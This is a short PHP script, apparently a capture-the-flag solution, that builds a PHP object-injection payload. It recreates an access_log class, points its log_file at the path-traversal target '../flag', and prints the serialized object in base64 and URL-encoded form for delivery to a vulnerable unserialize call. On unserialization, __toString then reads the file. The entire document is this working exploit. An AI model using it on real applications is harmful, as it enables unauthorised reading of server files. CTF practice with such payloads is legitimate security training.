<?php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

$exploit = new access_log("../flag");
$st = serialize($exploit);
echo 'st: ';
echo $st;
$stbase = base64_encode($st);
echo 'stbase: ';
echo $stbase;
echo PHP_EOL;
$stbase_encode_url = urlencode($stbase);
echo 'stbase_encode_url: ';
echo $stbase_encode_url;
echo PHP_EOL;
$perm_urldecode = urldecode($stbase_encode_url);
$perm_base64_decode = base64_decode($perm_urldecode);
$perm = unserialize($perm_base64_decode);
/* $perm->is_admin(); */
?>

